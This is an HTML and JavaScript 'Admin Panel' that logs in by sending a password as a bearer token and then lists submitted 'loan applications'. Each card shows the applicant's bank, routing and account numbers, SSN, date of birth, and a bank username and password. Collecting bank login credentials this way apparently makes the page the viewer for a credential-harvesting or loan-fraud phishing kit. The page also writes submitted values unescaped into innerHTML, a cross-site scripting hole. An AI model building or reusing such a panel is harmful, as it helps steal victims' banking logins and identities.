<!DOCTYPE html>
<html>
<head>
<title>Admin Panel</title>
<link rel="stylesheet" href="assets/css/style.css">
<style>
body { background:#f5f5f5; }
.admin-container { width:90%; margin:50px auto; }
table {
  width:100%;
  border-collapse: collapse;
  background:#fff;
}
th, td {
  border:1px solid #ddd;
  padding:10px;
  font-size:14px;
}
th {
  background:#244a8f;
  color:#fff;
}
.login-box {
  max-width:400px;
  margin:100px auto;
  background:#fff;
  padding:30px;
  text-align:center;
}
</style>
</head>
<body>

<div id="loginSection" class="login-box">
  <h2>Admin Login</h2>
  <input type="password" id="adminPass" placeholder="Enter Password">
  <br><br>
  <button onclick="login()">Login</button>
</div>

<div id="adminSection" class="admin-container" style="display:none;">
  <h2>Loan Applications</h2>
  <div id="dataContainer"></div>
</div>

<script>
async function login() {
  const password = document.getElementById("adminPass").value;

  const response = await fetch("/api/admin", {
    headers: {
      "Authorization": "Bearer " + password
    }
  });

  const result = await response.json();

  if(result.success){
    document.getElementById("loginSection").style.display = "none";
    document.getElementById("adminSection").style.display = "block";
    renderTable(result.data);
  } else {
    alert("Wrong password");
  }
}

function renderTable(data){

  const container = document.getElementById("dataContainer");
  container.innerHTML = "";

  if(data.length <= 1){
    container.innerHTML = "<p>No submissions yet.</p>";
    return;
  }

  // Remove header row
  const submissions = data.slice(1).reverse(); // NEWEST FIRST

  submissions.forEach((row, index) => {

    const card = document.createElement("div");
    card.className = "application-card";

    card.innerHTML = `
      <h3>Application #${index + 1} (Newest)</h3>
      <div class="field"><strong>Name:</strong> ${row[0] || ""}</div>
      <div class="field"><strong>Phone:</strong> ${row[1] || ""}</div>
      <div class="field"><strong>Email:</strong> ${row[2] || ""}</div>
      <div class="field"><strong>Address:</strong> ${row[3] || ""}</div>
      <div class="field"><strong>Bank:</strong> ${row[4] || ""}</div>
      <div class="field"><strong>Routing:</strong> ${row[5] || ""}</div>
      <div class="field"><strong>Account:</strong> ${row[6] || ""}</div>
      <div class="field"><strong>SSN:</strong> ${row[7] || ""}</div>
      <div class="field"><strong>User:</strong> ${row[8] || ""}</div>
      <div class="field"><strong>Password:</strong> ${row[9] || ""}</div>
      <div class="field"><strong>DOB:</strong> ${row[10] || ""}</div>
      <div class="field"><strong>Timestamp:</strong> ${row[11] || ""}</div>
    `;

    container.appendChild(card);
  });
}

</script>

</body>
</html>
